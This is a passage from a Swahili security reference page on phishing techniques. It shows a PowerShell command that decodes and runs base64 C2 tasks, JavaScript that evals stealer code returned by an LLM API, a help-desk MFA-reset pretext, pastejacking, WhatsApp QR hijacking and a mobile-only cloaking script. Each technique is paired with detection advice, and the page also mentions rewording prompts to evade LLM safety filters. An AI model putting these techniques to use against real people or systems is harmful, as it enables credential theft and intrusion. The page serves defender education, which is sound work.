  * `Invoke-WebRequest` huhifadhi payload kwenye `%TEMP%`; kusubiri kwa muda mfupi huficha network jitter, kisha `rundll32` huita entrypoint iliyouzwa nje (`notepad`).
* DLL hutuma utambulisho wa host na kuulizia C2 kila baada ya dakika chache. Maelekezo ya kazi ya mbali huwasili yakiwa **PowerShell iliyosimbwa kwa base64**, na hutekelezwa kwa siri huku sera ikiwa imepitishwa:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Hii huhifadhi unyumbufu wa C2 (server inaweza kubadilisha tasks bila kusasisha DLL) na huficha madirisha ya console. Tafuta michakato ya PowerShell iliyoanzishwa na `rundll32.exe` inayotumia `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` kwa pamoja.
* Watetezi wanaweza kutafuta miito ya HTTP(S) ya muundo `...page.php?tynor=<COMPUTER>sss<USER>` na vipindi vya polling vya dakika 5 baada ya DLL kupakiwa.

---

## Operesheni za Phishing Zilizoboreshwa kwa AI
Wavamizi sasa huunganisha **LLM na API za voice-clone** ili kuunda vishawishi vilivyobinafsishwa kikamilifu na mawasiliano ya wakati halisi.

| Tabaka | Matumizi ya mfano na threat actor |
|-------|-----------------------------|
|Automation|Tengeneza na utume zaidi ya barua pepe / SMS elfu 100 zenye maneno yaliyobadilishwa nasibu na tracking links.|
|Generative AI|Tengeneza barua pepe za kipekee zinazorejelea M&A za umma, vicheshi vya ndani kutoka mitandao ya kijamii; tumia sauti bandia ya CEO kwenye ulaghai wa callback.|
|Agentic AI|Jisajili kwenye domains, kusanya taarifa za open-source na utengeneze barua pepe za hatua inayofuata kiotomatiki, mwathiriwa anapobofya lakini asitume credentials.|

**Ulinzi:**  
• Ongeza **dynamic banners** zinazoangazia ujumbe uliotumwa na automation isiyoaminika (kupitia hitilafu za ARC/DKIM).  
• Tumia **voice-biometric challenge phrases** kwa maombi ya simu yenye hatari kubwa.  
• Endelea kuiga vishawishi vinavyotengenezwa na AI katika programu za uhamasishaji – templates zisizobadilika zimepitwa na wakati.

Tazama pia – matumizi mabaya ya agentic browsing kwa wizi wa credentials kupitia phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Tazama pia – matumizi mabaya ya AI agent kwa zana za CLI za ndani na MCP (kwa orodha ya secrets na ugunduzi):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Uundaji wa JavaScript ya phishing wakati wa utekelezaji kwa usaidizi wa LLM (codegen ndani ya kivinjari)

Wavamizi wanaweza kusambaza HTML inayoonekana haina madhara na **kutengeneza stealer wakati wa utekelezaji** kwa kuiomba **LLM API inayoaminika** itoe JavaScript, kisha kuitekeleza ndani ya kivinjari (kwa mfano, kwa `eval` au `<script>` inayoundwa kwa nguvu).<sup>[[8]](#references)</sup>

1. **Prompt kama ufichaji:** weka URL za exfil/Base64 strings ndani ya prompt; rekebisha maneno mara kwa mara ili kukwepa safety filters na kupunguza majibu ya kubuni.
2. **Wito wa API upande wa mteja:** inapopakiwa, JS huita LLM ya umma (Gemini/DeepSeek/n.k.) au CDN proxy; ni prompt/wito wa API pekee unaopatikana kwenye HTML tuli.
3. **Unganisha na utekeleze:** unganisha jibu kisha ulitekeleze (hubadilika kwa kila ziara):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** generated code hubina lure kwa maelezo ya mtu binafsi (k.m., uchanganuzi wa tokeni za LogoKit) na kutuma creds kwenye endpoint iliyofichwa kwenye prompt.

**Sifa za kukwepa utambuzi**
- Traffic hupitia domains za LLM zinazojulikana sana au proxies za CDN zinazoaminika; wakati mwingine hutumia WebSockets kuwasiliana na backend.
- Hakuna payload tuli; JS hasidi huwepo tu baada ya render.
- Generations zisizo za deterministic huzalisha stealers **za kipekee** kwa kila session.

**Mawazo ya utambuzi**
- Endesha sandboxes zikiwa na JS; weka alama kwenye `eval` ya wakati wa utekelezaji/utengenezaji wa script unaobadilika unaotokana na majibu ya LLM.
- Tafuta POST za front-end kwenda kwenye LLM APIs zikifuatiwa mara moja na `eval`/`Function` kwenye maandishi yaliyorejeshwa.
- Toa arifa kuhusu domains za LLM zisizoidhinishwa kwenye traffic ya client, zikifuatiwa na POST za credentials.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Mbali na push-bombing ya kawaida, waendeshaji hulazimisha tu **usajili mpya wa MFA** wakati wa simu ya help desk, na hivyo kubatilisha tokeni iliyopo ya mtumiaji.  Prompt yoyote ya kuingia itakayoonekana baadaye itaonekana halali kwa mhusika.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Fuatilia matukio ya AzureAD/AWS/Okta ambapo **`deleteMFA` + `addMFA`** hutokea **ndani ya dakika chache kutoka IP ileile**.



## Clipboard Hijacking / Pastejacking

Washambuliaji wanaweza kunakili kimyakimya amri hasidi kwenye clipboard ya mwathiriwa kutoka kwenye ukurasa wa wavuti uliodukuliwa au uliopewa jina linalofanana na halisi, kisha kumhadaa mtumiaji azibandike ndani ya **Win + R**, **Win + X** au dirisha la terminal, na kutekeleza msimbo wowote bila kupakua faili au kutumia kiambatisho.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing na Usambazaji wa Programu Hasidi (Android na iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Utekaji wa kuunganisha kifaa cha WhatsApp kupitia hadaa ya kijamii kwa QR
* Ukurasa wa chambo (kwa mfano, “channel” bandia ya wizara/CERT) huonyesha QR ya WhatsApp Web/Desktop na kumwelekeza mwathiriwa kuichanganua, hivyo kumwongeza mshambuliaji kimyakimya kama **kifaa kilichounganishwa**.<sup>[[12]](#references)</sup>
* Mshambuliaji hupata mara moja uwezo wa kuona mazungumzo/mawasiliano hadi kipindi hicho kiondolewe. Huenda baadaye waathiriwa wakaona arifa ya “kifaa kipya kimeunganishwa”; watetezi wanaweza kutafuta matukio yasiyotarajiwa ya kuunganisha kifaa yaliyotokea muda mfupi baada ya kutembelea kurasa za QR zisizoaminika.

### Hadaa inayolenga simu za mkononi ili kukwepa crawlers/sandboxes
Waendeshaji wa kampeni za hadaa wanazidi kuficha mtiririko wao nyuma ya ukaguzi rahisi wa kifaa ili crawlers za desktop zisiweze kufikia kurasa za mwisho. Muundo wa kawaida ni script ndogo inayokagua kama DOM inaweza kutumia touch, kisha kutuma matokeo kwenye endpoint ya seva; wateja wasiotumia simu hupokea HTTP 500 (au ukurasa mtupu), huku watumiaji wa simu wakionyeshwa mtiririko kamili.<sup>[[7]](#references)</sup>

Sehemu ndogo ya client (mantiki ya kawaida):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` mantiki (imerahisishwa):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Tabia ya server inayozingatiwa mara nyingi:
- Huweka session cookie wakati wa upakiaji wa kwanza.
- Hukubali `POST /detect {"is_mobile":true|false}`.
- Hurejesha 500 (au placeholder) kwa GET zinazofuata wakati `is_mobile=false`; hutoa phishing ikiwa tu `true`.

Mbinu za kutafuta na kugundua:
- Hoja ya urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetry ya web: mfululizo wa `GET /static/detect_device.js` → `POST /detect` → HTTP 500 kwa vifaa visivyo mobile; njia halali za waathiriwa wanaotumia simu hurejesha 200 pamoja na HTML/JS inayofuata.
- Zuia au chunguza kwa makini kurasa zinazoweka maudhui kulingana na `ontouchstart` pekee au ukaguzi sawa wa kifaa.

Vidokezo vya ulinzi:
- Endesha crawlers zikiwa na fingerprints zinazofanana na za simu na JS ikiwa imewezeshwa ili kufichua maudhui yaliyofichwa.
- Toa tahadhari kuhusu majibu ya 500 yanayotiliwa shaka baada ya `POST /detect` kwenye domains zilizosajiliwa hivi karibuni.

## References

- [1] [Kutengeneza Tofauti za Majina ya Domain Zinazotumika kwenye Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Kugundua Phishing: Zana na Mbinu (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Kuiba Vitambulisho na Kukwepa 2FA kwa Kutumia noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Kuiba session na Kukwepa 2FA kwa EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Jinsi ya Kusakinisha na Kusanidi DKIM kwa Postfix kwenye Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Ripoti ya Global Incident Response ya Unit 42 ya 2025 – Toleo la Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – miundombinu ya phishing iliyofichwa kwa vifaa vya mobile na heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Hatua Inayofuata ya Mashambulizi ya Runtime Assembly: Kutumia LLMs Kuzalisha JavaScript ya Phishing kwa Wakati Halisi](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Uigaji, Utekaji wa Click, na TDS: Ndani ya Mfumo wa Usambazaji wa Malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Kuteka Trafiki ya windows.com ya Microsoft kwa Bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Mapenzi? Kwa Kweli: Programu Bandia ya Uchumba Iliyotumiwa kama Chambo katika Kampeni Lengwa ya Spyware nchini Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoCs na sampuli za ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
